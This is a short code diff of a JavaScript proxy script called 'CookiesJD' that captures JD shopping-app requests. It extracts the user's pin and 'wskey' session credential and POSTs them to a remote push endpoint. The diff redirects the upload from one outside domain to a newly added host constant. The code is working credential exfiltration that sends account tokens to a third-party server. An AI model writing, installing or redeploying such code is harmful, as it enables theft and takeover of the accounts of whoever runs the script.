@@ -33,6 +33,7 @@ const APIKey = 'CookiesJD';
 const $ = new API(APIKey, true);
 const CacheKey = `#${APIKey}`;
 const mute = '#cks_get_mute';
+const host = "https://api.oaife.com"
 $.mute = $.read(mute);
 if ($request) GetCookie();
 $.done();
@@ -47,7 +48,7 @@ function GetCookie() {
             var wsk = CV.match(/wskey=.+?;/);
             var realWsk = userPin + wsk[0]
             let data={"source":"jd_app","type":"wsk","value":realWsk,"pin":userPin}
-            const opt = {url: "http://api.bilin.eu.org/push", body: JSON.stringify(data)}
+            const opt = {url: `${host}/push`, body: JSON.stringify(data)}
             $.http.post(opt).then((response) => JSON.parse(response.body))
         }else {
             $.notify('获取失败', '', '请检查匹配URL或配置内脚本类型 ‼️');
